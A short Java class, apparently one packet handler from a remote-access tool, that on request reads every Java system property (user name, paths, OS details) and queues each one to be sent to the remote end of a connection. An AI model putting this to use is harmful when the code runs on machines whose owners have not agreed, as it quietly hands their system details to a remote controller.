package com.redpois0n.packets;

import java.util.Set;

import com.redpois0n.Connection;


public class PacketPROP extends Packet {

	@Override
	public void read(String line) throws Exception {
		Set<Object> set = System.getProperties().keySet();
		for (Object str : set) {
			Connection.addToSendQueue(new PacketBuilder(Header.VARIABLES_PROPERTIES, new String[] { str.toString(), System.getProperty(str.toString()) }));
		}
	}

}
